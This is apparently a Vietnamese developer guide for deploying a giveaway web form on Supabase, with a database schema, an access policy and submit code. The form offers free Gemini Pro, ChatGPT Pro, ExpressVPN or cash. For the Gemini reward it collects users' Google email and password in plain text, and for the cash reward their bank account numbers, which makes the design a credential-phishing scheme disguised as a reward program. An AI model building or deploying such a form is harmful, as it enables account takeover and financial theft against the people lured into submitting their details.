# Multi-Reward System Setup Guide

## 📋 Tổng Quan Hệ Thống

Hệ thống đã được cập nhật để hỗ trợ **4 loại phần thưởng** khác nhau:

### 1. **GEMINI PRO 1 Năm** (reward_type: `gemini`)
- Hiển thị cho: Cả tiếng Việt và tiếng Anh
- Thông tin cần lưu:
  - Email Google
  - Password
  - Email liên hệ

### 2. **50K Tiền Mặt** (reward_type: `cash`)
- Hiển thị cho: **Chỉ tiếng Việt** (ẩn với tiếng Anh)
- Thông tin cần lưu:
  - Email liên hệ
  - Số tài khoản
  - Tên ngân hàng

### 3. **CHAT GPT PRO 1 Tháng** (reward_type: `chatgpt`)
- Hiển thị cho: Cả tiếng Việt và tiếng Anh
- Thông tin cần lưu:
  - Email liên hệ
  - Email muốn mời vào ChatGPT

### 4. **EXPRESS VPN 1 Tháng** (reward_type: `expressvpn`)
- Hiển thị cho: Cả tiếng Việt và tiếng Anh
- Thông tin cần lưu:
  - Email liên hệ (để nhận tài khoản + mật khẩu)

---

## 🗄️ Cấu Trúc Database

### Bảng Mới: `reward_requests`

```sql
CREATE TABLE reward_requests (
  id BIGSERIAL PRIMARY KEY,
  reward_type TEXT NOT NULL,           -- 'gemini', 'cash', 'chatgpt', 'expressvpn'
  selected_option TEXT,                 -- Tùy chọn (nếu có)
  reward_details TEXT NOT NULL,         -- JSON string chứa tất cả thông tin
  status TEXT DEFAULT 'pending',        -- 'pending', 'approved', 'rejected', 'completed'
  created_at TIMESTAMPTZ DEFAULT NOW(),
  updated_at TIMESTAMPTZ
);

-- Tạo index
CREATE INDEX idx_reward_requests_status ON reward_requests(status);
CREATE INDEX idx_reward_requests_reward_type ON reward_requests(reward_type);
CREATE INDEX idx_reward_requests_created_at ON reward_requests(created_at);
```

### Row Level Security (RLS)

```sql
-- Enable RLS
ALTER TABLE reward_requests ENABLE ROW LEVEL SECURITY;

-- Cho phép insert từ client
CREATE POLICY "Enable insert for all users" ON reward_requests
  FOR INSERT TO anon
  WITH CHECK (true);

-- Cho phép read cho admin
CREATE POLICY "Enable read for authenticated users only" ON reward_requests
  FOR SELECT TO authenticated
  USING (true);
```

---

## 📝 Định Dạng Dữ Liệu `reward_details`

Tất cả thông tin được lưu dưới dạng **JSON string** trong cột `reward_details`.

### 1. GEMINI PRO
```json
{
  "email": "user@gmail.com",
  "password": "password123",
  "contact_email": "contact@gmail.com"
}
```

### 2. TIỀN MẶT
```json
{
  "contact_email": "contact@gmail.com",
  "account_number": "1234567890",
  "bank_name": "Vietcombank"
}
```

### 3. CHAT GPT PRO
```json
{
  "contact_email": "contact@gmail.com",
  "chatgpt_invite_email": "invite@gmail.com"
}
```

### 4. EXPRESS VPN
```json
{
  "contact_email": "contact@gmail.com"
}
```

---

## 📂 Các File Được Cập Nhật/Tạo Mới

### 1. **config.js** (Tất cả 3 folder)
- `/config.js` (gốc)
- `/en/config.js`
- `/vi/config.js`

**Cập nhật:** Hướng dẫn tạo bảng `reward_requests` thay vì `gemini_requests`

### 2. **reward-manager.js** (Mới - tất cả 2 folder)
- `/en/reward-manager.js`
- `/vi/reward-manager.js`

**Chức năng:**
- Định nghĩa `REWARD_TYPES` và `REWARD_CONFIGS`
- `buildRewardDetails()` - Chuyển form data thành JSON string
- `parseRewardDetails()` - Parse JSON string thành object
- `validateRewardForm()` - Kiểm tra form hợp lệ
- `getVisibleRewardTypes()` - Lấy các loại phần thưởng hiển thị theo ngôn ngữ
- `formatRewardDisplay()` - Format để hiển thị dữ liệu

### 3. **index.html** (Sắp được cập nhật)
Cần thêm:
- Bước chọn loại phần thưởng (step 1.5 hoặc thành phần trong step 3)
- Form động dựa trên loại phần thưởng được chọn

### 4. **script.js** (Sắp được cập nhật)
Cần cập nhật:
- Hàm `submitForm()` để sử dụng `buildRewardDetails()`
- Thay đổi table từ `gemini_requests` sang `reward_requests`
- Thêm xử lý lựa chọn phần thưởng
- Thêm validation sử dụng `validateRewardForm()`

---

## 🚀 Hướng Dẫn Triển Khai

### Bước 1: Cập Nhật Database (Supabase)
1. Đăng nhập Supabase
2. Chạy SQL từ hướng dẫn ở `config.js`
3. Tạo bảng `reward_requests` với các cột và index như hướng dẫn

### Bước 2: Cập Nhật HTML
- Thêm phần chọn loại phần thưởng
- Thêm reference đến `reward-manager.js` trong `<script>`

### Bước 3: Cập Nhật JavaScript
- Import `reward-manager.js`
- Cập nhật `submitForm()` function
- Thêm xử lý chọn phần thưởng
- Thay đổi table name: `gemini_requests` → `reward_requests`

### Bước 4: Test
- Kiểm tra tất cả 4 loại phần thưởng
- Xác nhận dữ liệu được lưu đúng định dạng JSON
- Kiểm tra hiển thị/ẩn theo ngôn ngữ (Cash chỉ hiển thị VI)

---

## 🔍 Ví Dụ Xử Lý Submit Form

```javascript
async function submitForm() {
    // Lấy selected reward type
    const selectedRewardType = document.getElementById('rewardType').value;
    
    // Validation
    const formData = {
        email: document.getElementById('email')?.value,
        password: document.getElementById('password')?.value,
        contactEmail: document.getElementById('contactEmail')?.value,
        accountNumber: document.getElementById('accountNumber')?.value,
        bankName: document.getElementById('bankName')?.value,
        chatgptInviteEmail: document.getElementById('chatgptInviteEmail')?.value
    };
    
    const validation = validateRewardForm(selectedRewardType, formData);
    if (!validation.valid) {
        showNotification(validation.error, 'error');
        return;
    }
    
    // Build reward details
    const rewardDetails = buildRewardDetails(selectedRewardType, formData);
    
    // Save to Supabase
    try {
        const { data, error } = await supabase
            .from('reward_requests')
            .insert([
                {
                    reward_type: selectedRewardType,
                    reward_details: rewardDetails,
                    status: 'pending',
                    created_at: new Date().toISOString()
                }
            ]);
        
        if (error) throw new Error(error.message);
        
        showNotification('Đã gửi thông tin thành công!', 'success');
        nextStep();
    } catch (error) {
        showNotification(error.message, 'error');
    }
}
```

---

## 📊 Admin Dashboard Cập Nhật

Admin panel cần cập nhật để:
- Hiển thị `reward_type` (loại phần thưởng)
- Parse và hiển thị `reward_details` dưới dạng dễ đọc
- Thêm filter theo `reward_type`
- Hiển thị dữ liệu theo định dạng phù hợp

---

## ✅ Checklist Triển Khai

- [ ] Cập nhật Database (tạo bảng `reward_requests`)
- [ ] Kiểm tra `reward-manager.js` hoạt động
- [ ] Cập nhật HTML thêm reward selection
- [ ] Cập nhật `script.js` `submitForm()` function
- [ ] Cập nhật `script.js` thay đổi table name
- [ ] Test toàn bộ 4 loại phần thưởng
- [ ] Test ngôn ngữ (Cash chỉ hiển thị VI)
- [ ] Cập nhật Admin Dashboard (tùy chọn)
- [ ] Deploy lên production

---

## 💡 Ghi Chú Quan Trọng

1. **JSON String Format:** Tất cả dữ liệu được lưu dưới dạng JSON string trong một cột
2. **Language Hiding:** Cash reward chỉ hiển thị với tiếng Việt (`hideForLanguage: ['en']`)
3. **Flexible Storage:** Có thể dễ dàng thêm phần thưởng mới bằng cách cập nhật `REWARD_CONFIGS`
4. **Admin Access:** Cần parse JSON khi hiển thị trong admin panel

---

## 📞 Support

Nếu có câu hỏi hoặc cần hỗ trợ, hãy liên hệ!
